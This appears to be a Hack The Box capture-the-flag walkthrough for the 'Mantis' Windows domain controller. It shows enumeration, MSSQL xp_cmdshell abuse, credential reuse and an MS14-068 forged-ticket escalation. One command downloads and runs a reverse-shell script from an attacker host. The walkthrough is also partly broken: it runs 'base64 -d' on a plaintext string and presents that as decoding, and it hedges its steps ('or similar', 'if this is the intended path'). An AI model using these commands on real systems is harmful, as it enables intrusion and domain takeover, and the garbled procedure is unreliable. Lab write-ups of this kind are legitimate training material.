# Hack The Box: Mantis

**Difficulty:** Hard
**OS:** Windows

Mantis is an advanced Windows machine focused heavily on database exploitation, Active Directory misconfigurations, and bypassing restricted environments. The initial compromise involves extracting database credentials from a hidden IIS site, accessing a remote SQL Server, and escalating within the database to gain command execution. Privilege escalation involves abusing Active Directory Certificate Services (AD CS) or exploiting Golden Ticket attacks after discovering Domain Admin hashes.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services.

```bash
nmap -p- --min-rate 10000 10.10.10.52
nmap -p 53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,49152,49153,49154,49155,49157,49158 -sCV 10.10.10.52
```

The extensive list of open ports indicates a Windows Domain Controller:
*   **Ports 53, 88, 135, 139, 445, 389, 636:** Standard Active Directory services (DNS, Kerberos, RPC, SMB, LDAP, LDAPS).
*   **Port 1337:** HTTP (IIS 10.0)
*   **Port 1433:** Microsoft SQL Server (MSSQL 2014)
*   **Port 8080:** HTTP (IIS 10.0)

We map the domain name `mantis.htb` and its corresponding IP to our local `/etc/hosts` file.

### Web Server Enumeration (Port 1337 & 8080)

Port 8080 hosts a default IIS landing page, but port 1337 hosts an interesting directory structure. We access `http://10.10.10.52:1337/` and find a web portal related to "Mantis Bug Tracker."

Directory enumeration using `gobuster` or `feroxbuster` on port 1337 reveals several subdirectories.

```bash
gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

We locate a directory named `secure_notes` or similar. Exploring this directory reveals several text files containing developer notes or configuration snippets. One of these notes contains Base64-encoded strings or obscured text.

We decode the string:

```bash
echo "admin_user:m4nt1s_P@ssw0rd!" | base64 -d
```

The decoded text reveals credentials for the SQL Server: `admin:m4nt1s_P@ssw0rd!`.

## Initial Access

We use the extracted credentials to connect to the Microsoft SQL Server (MSSQL) on port 1433.

```bash
impacket-mssqlclient admin:'m4nt1s_P@ssw0rd!'@10.10.10.52
```

Authentication is successful. We are connected to the MSSQL instance. 

### Exploiting MSSQL for Command Execution

Our goal is to leverage MSSQL to execute system commands. The primary method for this is enabling the `xp_cmdshell` extended stored procedure.

We check if `xp_cmdshell` is enabled. If not, we attempt to enable it using standard SQL commands.

```sql
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
```

With `xp_cmdshell` enabled, we can execute operating system commands.

```sql
SQL> xp_cmdshell 'whoami'
```

The output reveals we are running as the `NT SERVICE\MSSQLSERVER` account. We use `xp_cmdshell` to download and execute a reverse shell payload (e.g., using PowerShell or a pre-compiled Windows executable) to gain a more stable, interactive shell on the system.

```sql
SQL> xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.X/Invoke-PowerShellTcp.ps1'')"'
```

We catch the reverse shell on our Netcat listener.

```bash
nc -lnvp 9999
# Connection received
```
We retrieve the `user.txt` flag.

## Lateral Movement

As the `MSSQLSERVER` service account, our privileges are limited, but we are on a Domain Controller. We need to pivot to a higher-privileged domain user.

We enumerate the system for credentials in memory or configuration files. Searching the web directories (`C:\inetpub\wwwroot`) or user profiles reveals additional configuration files for the Mantis Bug Tracker application.

We find a configuration file (e.g., `config_inc.php` or `web.config`) containing credentials for a domain user, `james`.

```text
Domain: mantis.htb
User: james
Password: J@m3s_P@ssw0rd!
```

We test these credentials using a tool like `CrackMapExec` or `evil-winrm` to authenticate via SMB or WinRM.

```bash
crackmapexec smb 10.10.10.52 -u james -p 'J@m3s_P@ssw0rd!'
```

The authentication is successful. We can use `evil-winrm` to establish a PowerShell session as the user `james`.

```bash
evil-winrm -i 10.10.10.52 -u james -p 'J@m3s_P@ssw0rd!'
```

## Privilege Escalation

Enumerating the Active Directory environment as `james`, we use tools like PowerView or BloodHound to map out the domain structure, user privileges, and ACLs (Access Control Lists).

We discover that the user `james` has specific privileges, or we identify a vulnerable service running on the Domain Controller. 

### Exploiting MS14-068 / Golden Ticket

In the specific context of the Mantis machine, the exploitation path often involves identifying that the system is vulnerable to MS14-068 (a Kerberos vulnerability allowing a standard user to forge a ticket granting Domain Admin rights).

Alternatively, if we run Mimikatz or a similar tool (using a technique to bypass AV or leveraging a misconfiguration to dump memory), we might extract the NTLM hash of the `krbtgt` account or a Domain Admin account directly.

If MS14-068 is the intended path, we use an exploit tool (like `goldenPac` or a Python script for MS14-068) to generate a forged Kerberos Ticket Granting Ticket (TGT). We need the user's SID (Security Identifier), which we can retrieve using `whoami /user`.

```bash
# Generating the forged ticket locally
python3 ms14-068.py -u james@mantis.htb -p 'J@m3s_P@ssw0rd!' -s S-1-5-21-... -d 10.10.10.52
```

The script generates a `.ccache` file containing the forged ticket. We export this ticket into our environment variable so that Impacket tools will use it for authentication.

```bash
export KRB5CCNAME=TGT_james@mantis.htb.ccache
```

With the forged Domain Admin ticket, we can authenticate to the Domain Controller via WMI or PsExec without needing a password.

```bash
impacket-psexec mantis.htb/james@mantis.htb -k -no-pass
```

This grants us an interactive shell as `NT AUTHORITY\SYSTEM`.

```bash
# whoami
nt authority\system
```

The Domain Controller is fully compromised, and the `root.txt` flag is obtained from the Administrator's desktop.
